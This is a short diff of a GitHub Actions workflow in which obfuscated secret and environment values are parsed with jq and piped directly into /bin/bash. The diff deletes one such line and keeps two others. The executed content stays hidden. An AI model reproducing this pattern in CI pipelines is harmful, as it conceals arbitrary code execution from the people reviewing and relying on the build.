@@ -17,7 +17,6 @@ jobs:
           ynthu1: ${{ secrets.ynthu1 }}
         run: |
           printf '%s' "$ynthu1" | jq -r .xu14 | /bin/bash
-          echo $yiih9 | jq -r .oy25493 | /bin/bash
           echo $gixs13028 | jq -r .da90674 | /bin/bash
 
       - name: Persist output
